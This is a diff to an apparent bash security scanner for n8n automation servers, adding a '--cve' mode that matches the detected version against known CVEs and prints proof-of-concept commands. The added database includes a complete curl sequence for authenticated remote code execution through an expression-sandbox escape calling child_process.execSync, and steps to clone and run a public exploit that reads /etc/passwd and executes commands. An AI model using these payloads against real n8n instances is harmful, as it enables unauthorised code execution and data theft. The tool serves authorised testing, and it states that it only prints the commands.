@@ -47,6 +47,14 @@
 #                            editor) in addition to the production /webhook/ base
 #   --reveal-secrets         Print full secret values instead of masked previews
 #   --nuclei                 Also run nuclei's n8n-tagged templates if installed
+#   --cve                    Check the detected version against a curated
+#                            database of known n8n CVEs (works standalone —
+#                            no --nuclei required — and also cross-references
+#                            any CVE-tagged nuclei hits if --nuclei is also
+#                            passed) and print, for each match, the exact
+#                            preconditions and command(s) to attempt it —
+#                            sourced from public vendor/researcher advisories.
+#                            This only PRINTS commands; it never runs them.
 #   --no-color               Disable ANSI colors
 #   -h, --help               Show this help
 #
@@ -81,9 +89,10 @@ WEBHOOK_METHODS="GET,POST"
 WEBHOOK_DELAY=0.3
 INCLUDE_TEST_WEBHOOKS=false
 RUN_NUCLEI=false
+CVE_MODE=false
 NO_COLOR=false
 REVEAL_SECRETS=false
-print_help() { sed -n '2,64p' "$0" | sed 's/^# \{0,1\}//'; }
+print_help() { sed -n '2,72p' "$0" | sed 's/^# \{0,1\}//'; }
 while [[ $# -gt 0 ]]; do
     case "$1" in
         --file) TARGET_FILE="${2:-}"; shift 2 ;;
@@ -101,6 +110,7 @@ while [[ $# -gt 0 ]]; do
         --include-test-webhooks) INCLUDE_TEST_WEBHOOKS=true; shift ;;
         --reveal-secrets) REVEAL_SECRETS=true; shift ;;
         --nuclei) RUN_NUCLEI=true; shift ;;
+        --cve) CVE_MODE=true; shift ;;
         --no-color) NO_COLOR=true; shift ;;
         -h|--help) print_help; exit 0 ;;
         *)
@@ -385,6 +395,107 @@ webhook_probe() {
     else
         echo "OTHER($status)|$status"
     fi
+}
+# ---------------------------------------------------------------------------
+# Known-CVE proof-of-concept database (used by --cve)
+# ---------------------------------------------------------------------------
+# Simple dotted-version compare (numeric, up to 4 components; anything past
+# the numeric prefix — e.g. "-beta.1" — is ignored). Good enough for n8n's
+# own x.y.z / x.y.z-suffix scheme.
+ver_norm() { echo "$1" | grep -oE '^[0-9]+(\.[0-9]+){0,3}'; }
+ver_cmp() {
+    local a b n i x y
+    a=$(ver_norm "$1"); b=$(ver_norm "$2")
+    [[ -z "$a" ]] && a="0"; [[ -z "$b" ]] && b="0"
+    local IFS=.
+    local -a pa=($a) pb=($b)
+    n=${#pa[@]}; [[ ${#pb[@]} -gt $n ]] && n=${#pb[@]}
+    for ((i=0; i<n; i++)); do
+        x=${pa[i]:-0}; y=${pb[i]:-0}
+        if ((10#$x > 10#$y)); then echo 1; return; fi
+        if ((10#$x < 10#$y)); then echo -1; return; fi
+    done
+    echo 0
+}
+ver_ge() { [[ "$(ver_cmp "$1" "$2")" != "-1" ]]; }
+ver_lt() { [[ "$(ver_cmp "$1" "$2")" == "-1" ]]; }
+cvss_to_sev() {
+    # cvss_to_sev <score-or-"unspecified"> -> CRIT/HIGH/MED/LOW
+    if [[ "$1" =~ ^[0-9.]+$ ]]; then
+        awk -v c="$1" 'BEGIN{ if (c>=9) print "CRIT"; else if (c>=7) print "HIGH"; else if (c>=4) print "MED"; else print "LOW"; }'
+    else
+        echo "HIGH"
+    fi
+}
+# Each CVE is one or more rows (n8n sometimes has multiple disjoint
+# vulnerable ranges across release branches for the same advisory);
+# MINVER inclusive, MAXVER exclusive (i.e. the first fixed release for
+# that range). Sourced from public vendor/researcher advisories only —
+# see the note/cmd text for exactly what is and isn't independently
+# confirmed. This is NOT a substitute for reading the advisories yourself.
+declare -a CVE_DB_ID=() CVE_DB_NAME=() CVE_DB_MINVER=() CVE_DB_MAXVER=() CVE_DB_AUTH=() CVE_DB_CVSS=() CVE_DB_NOTE=() CVE_DB_CMD=()
+add_cve_row() {
+    CVE_DB_ID+=("$1"); CVE_DB_NAME+=("$2"); CVE_DB_MINVER+=("$3"); CVE_DB_MAXVER+=("$4")
+    CVE_DB_AUTH+=("$5"); CVE_DB_CVSS+=("$6"); CVE_DB_NOTE+=("$7"); CVE_DB_CMD+=("$8")
+}
+add_cve_row "CVE-2025-68613" \
+    "n8n expression-sandbox escape -> authenticated RCE" \
+    "0.211.0" "1.120.4" "authenticated" "9.9" \
+    "Requires an authenticated session or API key (any role that can create/edit workflows) — get one first with --test-cred/--userpass or your own engagement creds. Publicly detailed by SecureLayer7." \
+    "# 1) Authenticate and capture the session cookie:
+curl -sk -c cookies.txt -X POST '{{TARGET}}/rest/login' \\
+  -H 'Content-Type: application/json' \\
+  --data '{\"emailOrLdapLoginId\":\"<user>\",\"password\":\"<pass>\"}'
+# 2) Create a workflow whose Set-node expression escapes the sandbox:
+curl -sk -b cookies.txt -X POST '{{TARGET}}/rest/workflows' \\
+  -H 'Content-Type: application/json' \\
+  --data '{\"name\":\"poc\",\"active\":false,\"nodes\":[{\"name\":\"Start\",\"type\":\"n8n-nodes-base.start\",\"position\":[250,300]},{\"name\":\"RCE\",\"type\":\"n8n-nodes-base.set\",\"position\":[450,300],\"parameters\":{\"values\":{\"string\":[{\"name\":\"out\",\"value\":\"={{ (function(){var r=this.process.mainModule.require; return r(\\\"child_process\\\").execSync(\\\"id\\\").toString(); })() }}\"}]}}}],\"connections\":{\"Start\":{\"main\":[[{\"node\":\"RCE\",\"type\":\"main\",\"index\":0}]]}}}'
+# 3) Execute the workflow (grab the new workflow id from step 2's response) and read \"out\" in the result:
+curl -sk -b cookies.txt -X POST '{{TARGET}}/rest/workflows/<id>/run'"
+add_cve_row "CVE-2025-68613" \
+    "n8n expression-sandbox escape -> authenticated RCE" \
+    "1.121.0" "1.121.1" "authenticated" "9.9" \
+    "Requires an authenticated session or API key (any role that can create/edit workflows) — get one first with --test-cred/--userpass or your own engagement creds. Publicly detailed by SecureLayer7." \
+    "# Same technique as the 0.211.0-1.120.3 range — see that entry."
+add_cve_row "CVE-2026-21858" \
+    "\"Ni8mare\" — unauthenticated arbitrary file read -> RCE chain" \
+    "1.65.0" "1.121.0" "unauthenticated (needs a reachable public Form/Webhook workflow with a file-upload field)" "10.0" \
+    "Requires a public-facing Form/Webhook workflow with a file-upload field already published on this instance — use --webhook-brute or manual recon to find one. Public PoC tool: Chocapikk/CVE-2026-21858 on GitHub." \
+    "git clone https://github.com/Chocapikk/CVE-2026-21858.git && cd CVE-2026-21858
+uv run python exploit.py {{TARGET}} <form-path> --read /etc/passwd   # arbitrary file read
+uv run python exploit.py {{TARGET}} <form-path> --cmd \"id\"          # command execution"
+add_cve_row "CVE-2026-21877" \
+    "Authenticated code injection (chainable with CVE-2026-21858 for file write/RCE)" \
+    "0.0.0" "1.121.3" "authenticated" "unspecified (rated critical as part of the CVE-2026-21858 chain)" \
+    "No independently-confirmed curl-level PoC payload as of this writing — see the CCCS advisory AL26-001 and n8n's own security advisory for technical detail before attempting exploitation." \
+    "# No confirmed public PoC payload — verify manually per CCCS advisory AL26-001."
+add_cve_row "CVE-2026-1470" \
+    "Expression-sandbox bypass via decoy constructor in a 'with' statement -> authenticated RCE" \
+    "0.0.0" "1.123.17" "authenticated (workflow create/edit permission)" "9.9" \
+    "1.x branch. No independently-confirmed working payload string as of this writing — SonicWall's writeup describes the AST-bypass technique but does not publish one — verify manually." \
+    "# No confirmed public PoC payload — see SonicWall's CVE-2026-1470 writeup for the bypass technique."
+add_cve_row "CVE-2026-1470" \
+    "Expression-sandbox bypass via decoy constructor in a 'with' statement -> authenticated RCE" \
+    "2.0.0" "2.4.5" "authenticated (workflow create/edit permission)" "9.9" \
+    "2.x branch (<2.4.5). No independently-confirmed working payload string as of this writing — verify manually." \
+    "# No confirmed public PoC payload — see SonicWall's CVE-2026-1470 writeup for the bypass technique."
+add_cve_row "CVE-2026-1470" \
+    "Expression-sandbox bypass via decoy constructor in a 'with' statement -> authenticated RCE" \
+    "2.5.0" "2.5.1" "authenticated (workflow create/edit permission)" "9.9" \
+    "2.5.0 point release only. No independently-confirmed working payload string as of this writing — verify manually." \
+    "# No confirmed public PoC payload — see SonicWall's CVE-2026-1470 writeup for the bypass technique."
+cve_poc_lookup() {
+    # cve_poc_lookup <version> -> fills global CVE_POC_MATCH_IDX with
+    # indices into the CVE_DB_* arrays whose range contains <version>.
+    CVE_POC_MATCH_IDX=()
+    local v="$1"
+    [[ -z "$v" || "$v" == "unknown" ]] && return
+    local i
+    for i in "${!CVE_DB_ID[@]}"; do
+        if ver_ge "$v" "${CVE_DB_MINVER[$i]}" && ver_lt "$v" "${CVE_DB_MAXVER[$i]}"; then
+            CVE_POC_MATCH_IDX+=("$i")
+        fi
+    done
 }
 # ---------------------------------------------------------------------------
 # Per-target scan
@@ -840,12 +951,12 @@ with open(os.environ["N8KED_CSV_FILE"], "a", newline="") as f:
     # if others matched Medium). The full per-template nuclei output is
     # still shown verbatim in its own report section for detail/evidence.
     local NUCLEI_RAN=false
+    local -a CVE_IDS=()
+    local -a CVE_SEVS=()
     if [[ "$RUN_NUCLEI" == true ]]; then
         NUCLEI_RAN=true
         if [[ -n "$NUCLEI_OUT" && "$NUCLEI_OUT" != "nuclei not installed"* ]]; then
             local -A NUCLEI_SEEN=()
-            local -a CVE_IDS=()
-            local -a CVE_SEVS=()
             local WORST_SEV="" WORST_RANK=-1
             sev_rank() { case "$1" in CRIT) echo 4;; HIGH) echo 3;; MED) echo 2;; LOW) echo 1;; *) echo 0;; esac; }
             while IFS= read -r nline; do
@@ -898,6 +1009,51 @@ with open(os.environ["N8KED_CSV_FILE"], "a", newline="") as f:
         fi
     fi
     # -------------------------------------------------------------------
+    # --cve: known-CVE PoC lookup. Works standalone off the detected
+    # version (so it's useful even without --nuclei / without nuclei
+    # installed), and also cross-references any CVE IDs nuclei already
+    # confirmed above so both paths land in the same report section.
+    # -------------------------------------------------------------------
+    local -a CVE_POC_ROWS=()      # indices into CVE_DB_* to report
+    local -a CVE_POC_SOURCES=()   # parallel: how we matched it, for display
+    if [[ "$CVE_MODE" == true ]]; then
+        local -A CVE_POC_SEEN=()
+        cve_poc_lookup "$VERSION"
+        local idx cid
+        for idx in "${CVE_POC_MATCH_IDX[@]}"; do
+            cid="${CVE_DB_ID[$idx]}"
+            if [[ -z "${CVE_POC_SEEN[$cid]:-}" ]]; then
+                CVE_POC_SEEN[$cid]=1
+                CVE_POC_ROWS+=("$idx")
+                CVE_POC_SOURCES+=("version match ($VERSION falls in the known-vulnerable range — not independently confirmed against this target, verify manually)")
+            fi
+        done
+        local ncid
+        for ncid in "${CVE_IDS[@]}"; do
+            [[ -z "$ncid" || -n "${CVE_POC_SEEN[$ncid]:-}" ]] && continue
+            for idx in "${!CVE_DB_ID[@]}"; do
+                if [[ "${CVE_DB_ID[$idx]}" == "$ncid" ]]; then
+                    CVE_POC_SEEN[$ncid]=1
+                    CVE_POC_ROWS+=("$idx")
+                    CVE_POC_SOURCES+=("nuclei template match (active probe against this target)")
+                    break
+                fi
+            done
+        done
+        # Any CVE nuclei confirmed but our version-matcher missed (e.g.
+        # version string we parsed doesn't line up with the DB range)
+        # already has its own "known CVE(s)" Risk Summary line above; a
+        # version-only match (nuclei not run, or nuclei found nothing)
+        # has no Risk Summary entry yet, so add one here.
+        for idx in "${!CVE_POC_ROWS[@]}"; do
+            local dbidx="${CVE_POC_ROWS[$idx]}" src="${CVE_POC_SOURCES[$idx]}"
+            if [[ "$src" == version\ match* ]]; then
+                local psev; psev=$(cvss_to_sev "${CVE_DB_CVSS[$dbidx]}")
+                FINDINGS+=("$psev|cve|Possible unpatched software — n8n $VERSION falls in the known-vulnerable range for ${CVE_DB_ID[$dbidx]} (${CVE_DB_NAME[$dbidx]}) — not confirmed by an active probe; see CVE Proof-of-Concept section")
+            fi
+        done
+    fi
+    # -------------------------------------------------------------------
     # Output
     # -------------------------------------------------------------------
     # Exit-code bookkeeping has to happen unconditionally, BEFORE the JSON
@@ -930,6 +1086,15 @@ with open(os.environ["N8KED_CSV_FILE"], "a", newline="") as f:
         printf '%s\n' "${DISCLOSURE_HDRS[@]}" > "$TMPDIR/out_disclosure.txt"
         printf '%s\n' "${WEBHOOK_BRUTE_HITS[@]}" > "$TMPDIR/out_webhookhits.txt"
         printf '%s\n' "${BRUTE_VALID[@]}" > "$TMPDIR/out_brutevalid.txt"
+        local -a CVE_POC_JSON_ROWS=()
+        local jci jdbi jcmd
+        for jci in "${!CVE_POC_ROWS[@]}"; do
+            jdbi="${CVE_POC_ROWS[$jci]}"
+            jcmd="${CVE_DB_CMD[$jdbi]//\{\{TARGET\}\}/$TARGET}"
+            jcmd="${jcmd//$'\n'/$'\x1f'}"
+            CVE_POC_JSON_ROWS+=("${CVE_DB_ID[$jdbi]}|${CVE_DB_NAME[$jdbi]}|${CVE_DB_CVSS[$jdbi]}|${CVE_DB_AUTH[$jdbi]}|${CVE_POC_SOURCES[$jci]}|${CVE_DB_NOTE[$jdbi]}|$jcmd")
+        done
+        printf '%s\n' "${CVE_POC_JSON_ROWS[@]}" > "$TMPDIR/out_cvepoc.txt"
         if [[ "$HAVE_PY" == true ]]; then
             N8KED_TARGET="$TARGET" \
             N8KED_VERSION="$VERSION" \
@@ -955,6 +1120,8 @@ with open(os.environ["N8KED_CSV_FILE"], "a", newline="") as f:
             N8KED_DISCLOSURE_FILE="$TMPDIR/out_disclosure.txt" \
             N8KED_WHHITS_FILE="$TMPDIR/out_webhookhits.txt" \
             N8KED_BRUTEVALID_FILE="$TMPDIR/out_brutevalid.txt" \
+            N8KED_CVEPOC_FILE="$TMPDIR/out_cvepoc.txt" \
+            N8KED_CVE_MODE="$CVE_MODE" \
             python3 -c '
 import csv, json, os
 
@@ -994,6 +1161,16 @@ for line in read_lines(env("N8KED_WHHITS_FILE", "")):
 disclosure_headers = read_lines(env("N8KED_DISCLOSURE_FILE", ""))
 brute_valid_count = len(read_lines(env("N8KED_BRUTEVALID_FILE", "")))
 
+cve_pocs = []
+for line in read_lines(env("N8KED_CVEPOC_FILE", "")):
+    p = line.split("|", 6)
+    if len(p) >= 7:
+        cve_pocs.append({
+            "id": p[0], "name": p[1], "cvss": p[2], "auth": p[3],
+            "matched_via": p[4], "preconditions": p[5],
+            "command": p[6].replace("\x1f", "\n"),
+        })
+
 target = env("N8KED_TARGET", "")
 
 if to_bool(env("N8KED_EMIT_JSON", "false")):
@@ -1021,6 +1198,8 @@ if to_bool(env("N8KED_EMIT_JSON", "false")):
             "hits": webhook_hits,
         },
         "nuclei_ran": to_bool(env("N8KED_NUCLEI_RAN", "false")),
+        "cve_check_ran": to_bool(env("N8KED_CVE_MODE", "false")),
+        "cve_pocs": cve_pocs,
         "cors": env("N8KED_CORS", "none"),
         "endpoint_exposure": endpoints,
         "findings": findings,
@@ -1037,6 +1216,11 @@ if csv_path:
                 w.writerow([target, fnd["severity"], fnd["category"], fnd["message"]])
         else:
             w.writerow([target, "INFO", "none", "No issues flagged."])
+        for poc in cve_pocs:
+            msg = (poc["id"] + " (" + poc["name"] + ", CVSS " + poc["cvss"] + ") "
+                   + "— matched via " + poc["matched_via"]
+                   + " — full PoC command in --json output")
+            w.writerow([target, "INFO", "cve-poc", msg])
 '
         else
             [[ "$JSON_OUT" == true ]] && echo "{\"target\":\"$TARGET\",\"error\":\"python3 not available — JSON/CSV output requires python3\"}"
@@ -1192,6 +1376,28 @@ if csv_path:
     else
         echo
         printf "%s(known-CVE check skipped — rerun with --nuclei to check the detected version against nuclei's n8n-tagged CVE templates)%s\n" "$C_DIM" "$C_RESET"
+    fi
+    if [[ "$CVE_MODE" == true ]]; then
+        section "CVE Proof-of-Concept"
+        if [[ ${#CVE_POC_ROWS[@]} -eq 0 ]]; then
+            printf "%s│%s  %s✓ No known-CVE version ranges matched (detected version: %s)%s\n" "$C_CYN" "$C_RESET" "$C_GRN" "$VERSION" "$C_RESET"
+        else
+            printf "%s│%s  %sPoC commands only ever get PRINTED — nothing here is executed for you. Confirm scope before running any of it.%s\n" "$C_CYN" "$C_RESET" "$C_YEL" "$C_RESET"
+            local ci
+            for ci in "${!CVE_POC_ROWS[@]}"; do
+                local dbi="${CVE_POC_ROWS[$ci]}" src="${CVE_POC_SOURCES[$ci]}"
+                printf "%s│%s\n" "$C_CYN" "$C_RESET"
+                printf "%s│%s  %s%s%s — %s (CVSS %s, %s)\n" "$C_CYN" "$C_RESET" "$C_BOLD$C_RED" "${CVE_DB_ID[$dbi]}" "$C_RESET" "${CVE_DB_NAME[$dbi]}" "${CVE_DB_CVSS[$dbi]}" "${CVE_DB_AUTH[$dbi]}"
+                printf "%s│%s  %sMatched via:%s %s\n" "$C_CYN" "$C_RESET" "$C_DIM" "$C_RESET" "$src"
+                printf "%s│%s  %sPreconditions:%s %s\n" "$C_CYN" "$C_RESET" "$C_DIM" "$C_RESET" "${CVE_DB_NOTE[$dbi]}"
+                printf "%s│%s  %sCommand:%s\n" "$C_CYN" "$C_RESET" "$C_DIM" "$C_RESET"
+                local cmdtext="${CVE_DB_CMD[$dbi]//\{\{TARGET\}\}/$TARGET}"
+                while IFS= read -r cmdline; do
+                    printf "%s│%s    %s\n" "$C_CYN" "$C_RESET" "$cmdline"
+                done <<< "$cmdtext"
+            done
+        fi
+        footer
     fi
     # -------------------------------------------------------------------
     # Risk summary
